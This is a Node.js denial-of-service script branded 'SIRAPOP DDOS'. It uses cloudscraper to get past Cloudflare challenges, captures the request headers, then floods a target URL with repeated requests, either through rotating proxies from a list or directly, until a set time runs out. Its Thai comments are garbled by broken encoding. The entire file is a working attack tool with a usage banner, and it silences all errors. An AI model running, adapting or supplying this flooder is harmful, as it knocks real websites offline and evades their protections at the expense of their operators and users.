require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    path = require('path');

    //∂È“‰¡Ë‡¢È“‡ß◊ËÕπ„¢„ÀÈprint «‘∏’∑Ì“ß“π
if (process.argv.length !== 6) {
    console.log(`
    …Õª??Õª…Õª…Õª…Õª…Õª  …ª ? ?…Õª…Õª…Õª…Õª
    »Õª∫??º?Õ??Õº∫ ∫?Õº  ??ª»?º?Õº?Õ?»Õª»Õª
    »Õº??»Õ? ??  »Õº?    »Õº ? ?  ? ?»Õº»Õº
    Made With <3 By WeAreRainBowHAT ><
        Usage: node ${path.basename(__filename)} <http://example.com> <60> <150> <proxy.txt/raw>`
);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];

//functions  Ëß request
function send_req_proxy(proxy) {

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return;
            }
            resolve(response.request.headers);
        });
    });

    //¥÷ßheader À≈—ß®“°π—Èπ°Áflood
    getHeaders.then(function (result) {
         Object.keys(result).forEach(function (i, e) {
             console.log(i + ': ' + result[i]);
         });
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, function (error, response) {
                if (error) {
                     console.log(error.message);
                }
            });
        }
    });
}
function send_req_raw() {

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return;
            }
            resolve(response.request.headers);
        });
    });

    //¥÷ßheader À≈—ß®“°π—Èπ°Áflood
    getHeaders.then(function (result) {
         Object.keys(result).forEach(function (i, e) {
             console.log(i + ': ' + result[i]);
         });
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                followAllRedirects: false
            }, function (error, response) {
                if (error) {
                     console.log(error.message);
                }
            });
        }
    });
}

//loop„ÀÈfunctions send_req √—π‡√◊ËÕ¬Ê
if (process.argv[5] == "raw"){
    console.log(`
    …Õª…?ª…?ª…Õª…Õª?…Õ  …Õª…?ª…Õª?Õª…?ª…Õª…?ª
    ?Õ? ∫  ∫ ?Õ?∫  ??ª  »Õª ∫ ?Õ???º ∫ ∫?  ∫∫
    ? ? ?  ? ? ?»Õº? ?  »Õº ? ? ??»Õ ? »ÕºÕ?º
    SIRAPOP DDOS !<3!
    `)
    setInterval(() => {
        send_req_raw();
    });
} else {
    proxx();
}

function proxx(){
    let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
    console.log(`
    …Õª…?ª…?ª…Õª…Õª?…Õ  …Õª…?ª…Õª?Õª…?ª…Õª…?ª
    ?Õ? ∫  ∫ ?Õ?∫  ??ª  »Õª ∫ ?Õ???º ∫ ∫?  ∫∫
    ? ? ?  ? ? ?»Õº? ?  »Õº ? ? ??»Õ ? »ÕºÕ?º
    SIRAPOP DDOS !<3!
    `)
    setInterval(() => {
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        send_req_proxy(proxy);
    });
}

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {

});
process.on('unhandledRejection', function (err) {

});